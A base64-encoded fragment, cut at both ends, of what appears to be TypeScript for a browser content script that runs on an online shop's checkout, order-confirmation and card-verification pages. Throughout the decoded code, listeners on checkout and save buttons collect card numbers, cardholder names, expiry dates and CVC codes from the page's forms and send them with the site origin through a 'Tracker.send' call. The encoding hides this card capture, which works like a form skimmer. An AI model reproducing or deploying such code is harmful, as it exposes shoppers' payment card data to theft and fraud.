CAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVNwZWNpZmljRWxlbWVudEJ5VGFnTmFtZShzZWxmLCAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmNoZWNrLW91dC1yb290JykgYXMgSFRNTEVsZW1lbnQpLCAnc3BhbicsICdwYXltZW50LXRpdGxlJywgZnVuY3Rpb24gKF9fZGV0ZWN0ZWRFbGVtZW50OiBIVE1MRWxlbWVudCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWydjbGljaycsICdkYmxjbGljayddLmZvckVhY2goZnVuY3Rpb24gKGV2ZW50KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmJpbmQtYnV0dG9uLXdyYXAnKT8uZmlyc3RFbGVtZW50Q2hpbGQ/LmFkZEV2ZW50TGlzdGVuZXIoZXZlbnQsIGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVHJhY2tlci5zZW5kKHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQ6ICdzYXZlUGF5bWVudE1ldGhvZHNEYXRhJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZE51bWJlcic6IF9fZGV0ZWN0ZWRFbGVtZW50LnRleHRDb250ZW50LFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQnJhbmQnOiAnVW5rbm93bicsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRIb2xkZXInOiAnVW5rbm93bicsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRFeHBpcmUnOiAnVW5rbm93bicsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRDVkMnOiAnVW5rbm93bicsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2V2ZW50JzogJ2FkZCcsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3dvcmtXZWJzaXRlJzogd2luZG93LmxvY2F0aW9uLm9yaWdpblxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfSwgMTAwMCk7XG4gICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVBheW1lbnRTcGFuVGFnKHNlbGYsIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuY2hlY2stb3V0LXJvb3QnKSBhcyBIVE1MRWxlbWVudCksIGZ1bmN0aW9uIChfX2RldGVjdGVkRWxlbWVudDogYW55KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBbJ2NsaWNrJywgJ2RibGNsaWNrJ10uZm9yRWFjaChmdW5jdGlvbiAoZXZlbnQpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuYmluZC1idXR0b24td3JhcCcpPy5maXJzdEVsZW1lbnRDaGlsZD8uYWRkRXZlbnRMaXN0ZW5lcihldmVudCwgZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUcmFja2VyLnNlbmQoe1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogJ3NhdmVQYXltZW50TWV0aG9kc0RhdGEnLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YToge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkTnVtYmVyJzogKF9fZGV0ZWN0ZWRFbGVtZW50IGFzIEhUTUxFbGVtZW50KS50ZXh0Q29udGVudCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEJyYW5kJzogJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkSG9sZGVyJzogJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkRXhwaXJlJzogJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQ1ZDJzogJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdldmVudCc6ICdhZGQnLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd3b3JrV2Vic2l0ZSc6IHdpbmRvdy5sb2NhdGlvbi5vcmlnaW5cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICAgICAgaWYgKHdpbmRvdy5sb2NhdGlvbi5ocmVmLmluZGV4T2YoJ2NvbmZpcm1fb3JkZXIuaHRtJykgIT09IC0xKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnLmFycm93LWNvbnRlbnQnKS5sZW5ndGggIT09IDApIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCcuYXJyb3ctY29udGVudCcpLmZvckVhY2goZnVuY3Rpb24gKGRpdkVsZW1lbnQpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGl2RWxlbWVudC5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkaXZFbGVtZW50LmNsYXNzTGlzdC5jb250YWlucygnYXJyb3ctZG93bicpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IF9faW50ZXJ2YWwyID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmFkZC1uZXctY2FyZCcpICE9PSBudWxsKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKF9faW50ZXJ2YWwyKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsnY2xpY2snLCAnZGJsY2xpY2snXS5mb3JFYWNoKGZ1bmN0aW9uIChldmVudCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5hZGQtbmV3LWNhcmQnKT8uYWRkRXZlbnRMaXN0ZW5lcihldmVudCwgZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgX19pbnRlcnZhbDMgPSBzZXRJbnRlcnZhbChmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLm5ldy1jYXJkJykgIT09IG51bGwpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKF9faW50ZXJ2YWwzKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVQYXltZW50TmV3Q2FyZChzZWxmLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLm5ldy1jYXJkJykgYXMgSFRNTEVsZW1lbnQpLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbiAoZWxlbWVudHM6IGFueSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHBheW1lbnRNZXRob2RTdG9yZTogYW55ID0gW107XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuc2F2ZScpPy5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbGVtZW50cy5mb3JFYWNoKGZ1bmN0aW9uIChlbGVtZW50OiBhbnkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF5bWVudE1ldGhvZFN0b3JlLnB1c2goe1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2VsZW1lbnQnOiBlbGVtZW50Lm5vZGVOYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lkJzogZWxlbWVudC5pZCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd0eXBlJzogZWxlbWVudC50eXBlLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogZWxlbWVudC52YWx1ZVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRyYWNrZXIuc2VuZCh7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQ6ICdzYXZlUGF5bWVudE1ldGhvZHNEYXRhJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YToge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmROdW1iZXInOiBwYXltZW50TWV0aG9kU3RvcmVbMF0udmFsdWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEJyYW5kJzogJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRIb2xkZXInOiBwYXltZW50TWV0aG9kU3RvcmVbMV0udmFsdWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEV4cGlyZSc6IHBheW1lbnRNZXRob2RTdG9yZVsyXS52YWx1ZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQ1ZDJzogcGF5bWVudE1ldGhvZFN0b3JlWzNdLnZhbHVlLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2V2ZW50JzogJ2FkZCcsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnd29ya1dlYnNpdGUnOiB3aW5kb3cubG9jYXRpb24ub3JpZ2luXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXltZW50TWV0aG9kU3RvcmUgPSBbXTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSwgMTAwMCk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSlcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSwgMTAwMCk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG5cbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcubWl4LWVkY2FyZC1pdGVtJyk/LmNoaWxkRWxlbWVudENvdW50ICE9PSAwKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbDEpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBjYXJkQ29uZmlybUVsZW1lbnQgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcjY2hlY2tvdXQtYnV0dG9uJyk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgWydjbGljaycsICdkYmxjbGljayddLmZvckVhY2goZnVuY3Rpb24gKGV2ZW50KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhcmRDb25maXJtRWxlbWVudD8uYWRkRXZlbnRMaXN0ZW5lcihldmVudCwgZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlOiBhbnkgPSBbXTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5taXgtZWRjYXJkLWl0ZW0nKT8uY2hpbGROb2Rlcy5mb3JFYWNoKGZ1bmN0aW9uIChfX2NoaWxkRWxlbWVudCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoX19jaGlsZEVsZW1lbnQgYXMgSFRNTEVsZW1lbnQpLm5vZGVOYW1lID09PSAnU1BBTicgJiYgKF9fY2hpbGRFbGVtZW50IGFzIEhUTUxFbGVtZW50KS5jbGFzc0xpc3QuY29udGFpbnMoJ2ljb24nKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoKF9fY2hpbGRFbGVtZW50IGFzIEhUTUxFbGVtZW50KS5jbGFzc0xpc3QuY29udGFpbnMoJ3Zpc2EnKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGVtcFBheW1lbnRNZXRob2RzU3RvcmUucHVzaCh7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2VsZW1lbnQnOiAoX19jaGlsZEVsZW1lbnQgYXMgSFRNTEVsZW1lbnQpLm5vZGVOYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZCc6IChfX2NoaWxkRWxlbWVudCBhcyBIVE1MRWxlbWVudCkuaWQsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogJ3Zpc2EnXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoKF9fY2hpbGRFbGVtZW50IGFzIEhUTUxFbGVtZW50KS5ub2RlTmFtZSA9PT0gJ1NQQU4nICYmIChfX2NoaWxkRWxlbWVudCBhcyBIVE1MRWxlbWVudCkuY2xhc3NMaXN0LmNvbnRhaW5zKCdwYXktbmFtZScpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBQYXltZW50TWV0aG9kc1N0b3JlLnB1c2goe1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2VsZW1lbnQnOiAoX19jaGlsZEVsZW1lbnQgYXMgSFRNTEVsZW1lbnQpLm5vZGVOYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lkJzogKF9fY2hpbGRFbGVtZW50IGFzIEhUTUxFbGVtZW50KS5pZCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IF9fY2hpbGRFbGVtZW50LnRleHRDb250ZW50XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVHJhY2tlci5zZW5kKHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kOiAnc2F2ZVBheW1lbnRNZXRob2RzRGF0YScsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YToge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZE51bWJlcic6IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzBdLnZhbHVlLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEJyYW5kJzogdGVtcFBheW1lbnRNZXRob2RzU3RvcmVbMV0udmFsdWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkSG9sZGVyJzogJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEV4cGlyZSc6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRDVkMnOiAnVW5rbm93bicsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdldmVudCc6ICdhZGQnLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnd29ya1dlYnNpdGUnOiB3aW5kb3cubG9jYXRpb24ub3JpZ2luXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZSA9IFtdO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICBpZiAod2luZG93LmxvY2F0aW9uLmhyZWYuaW5kZXhPZigncGF5UmVzdWx0Lmh0bScpICE9PSAtMSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbDEpO1xuXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgaW50ZXJ2YWw0ID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcudmVyaWZ5LWNhcmQtZm9ybS1yb3cnKSAhPT0gbnVsbCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsNCk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcudmVyaWZ5LWNhcmQtY29uZmlybScpPy5maXJzdEVsZW1lbnRDaGlsZD8ubm9kZU5hbWUgPT09ICdCVVRUT04nKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbJ2NsaWNrJywgJ2RibGNsaWNrJ10uZm9yRWFjaChmdW5jdGlvbiAoZXZlbnQpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgdGVtcFBheW1lbnRNZXRob2RzU3RvcmU6IGFueSA9IFtdO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy52ZXJpZnktY2FyZC1jb25maXJtJyk/LmZpcnN0RWxlbWVudENoaWxkPy5hZGRFdmVudExpc3RlbmVyKGV2ZW50LCBmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVBheW1lbnRJbnB1dFRhZyhzZWxmLCAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLnZlcmlmeS1jYXJkLWZvcm0tcm93JykgYXMgSFRNTEVsZW1lbnQpLCAnY2FyZE4nLCBmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGVtcFBheW1lbnRNZXRob2RzU3RvcmUucHVzaCh7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2VsZW1lbnQnOiBfX2RldGVjdGVkRWxlbWVudC5ub2RlTmFtZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaWQnOiBfX2RldGVjdGVkRWxlbWVudC5pZCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndmFsdWUnOiBfX2RldGVjdGVkRWxlbWVudC52YWx1ZVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVQYXltZW50SW5wdXRUYWcoc2VsZiwgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy52ZXJpZnktY2FyZC1mb3JtLXJvdycpIGFzIEhUTUxFbGVtZW50KSwgJ2NhcmRIb2xkZXInLCBmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGVtcFBheW1lbnRNZXRob2RzU3RvcmUucHVzaCh7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2VsZW1lbnQnOiBfX2RldGVjdGVkRWxlbWVudC5ub2RlTmFtZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaWQnOiBfX2RldGVjdGVkRWxlbWVudC5pZCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndmFsdWUnOiBfX2RldGVjdGVkRWxlbWVudC52YWx1ZVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVQYXltZW50SW5wdXRUYWcoc2VsZiwgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy52ZXJpZnktY2FyZC1mb3JtLXJvdycpIGFzIEhUTUxFbGVtZW50KSwgJ2V4cGlyZXMnLCBmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGVtcFBheW1lbnRNZXRob2RzU3RvcmUucHVzaCh7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2VsZW1lbnQnOiBfX2RldGVjdGVkRWxlbWVudC5ub2RlTmFtZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaWQnOiBfX2RldGVjdGVkRWxlbWVudC5pZCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndmFsdWUnOiBfX2RldGVjdGVkRWxlbWVudC52YWx1ZVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVQYXltZW50SW5wdXRUYWcoc2VsZiwgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy52ZXJpZnktY2FyZC1mb3JtLXJvdycpIGFzIEhUTUxFbGVtZW50KSwgJ2N2YycsIGZ1bmN0aW9uIChfX2RldGVjdGVkRWxlbWVudDogYW55KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0Z